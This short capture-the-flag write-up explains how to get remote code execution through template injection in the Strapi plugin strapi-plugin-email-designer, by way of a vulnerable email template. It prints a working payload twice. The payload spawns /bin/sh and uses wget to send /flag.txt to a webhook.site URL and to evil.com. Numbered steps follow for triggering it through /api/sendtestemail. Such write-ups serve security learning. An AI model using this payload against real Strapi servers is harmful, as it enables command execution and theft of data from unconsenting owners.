Checking the dependencies you can see that `strapi-plugin-email-designer` is installed.

Checking the Github issues, you can see me trying to get in contact with the developer (they have ghosted me since January...)

[In this issue, I clearly pointed out they copied and pasted the vulnerable email template code from Strapi which made the plugin vulnerable to RCE](https://github.com/alexzaganelli/strapi-plugin-email-designer/issues/123).

[In the vulnerability disclosure for Strapi you can grab the SSTI email template payload](https://www.ghostccamm.com/blog/multi_strapi_vulns/).

```
<%= `${ process.binding("spawn_sync").spawn({"file":"/bin/sh","args":["/bin/sh","-c","wget https://webhook.site/93919218-4b8a-4092-9bfb-42782231afd1?flag=$(cat /flag.txt)"],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"/*<>%=*/}]}).output }` %>
```

Checking the provided source code, there is a custom API for sending emails from a template using the email designer plugin that can be accessed at `/api/sendtestemail/:refId`.

Exact steps to solve:

1. Login in with the provided account and create a custom email template using the email designer plugin with the following payload.

```
<%= `${ process.binding("spawn_sync").spawn({"file":"/bin/sh","args":["/bin/sh","-c","wget https://evil.com?flag=$(cat /flag.txt)"],"stdio":[{"readable":1,"writable":1,"type":"pipe"},{"readable":1,"writable":1,"type":"pipe"/*<>%=*/}]}).output }` %>
```

2. Send a request to `/api/sendtestemail/{refId}` where `{refId}` is the template reference ID created in step 1.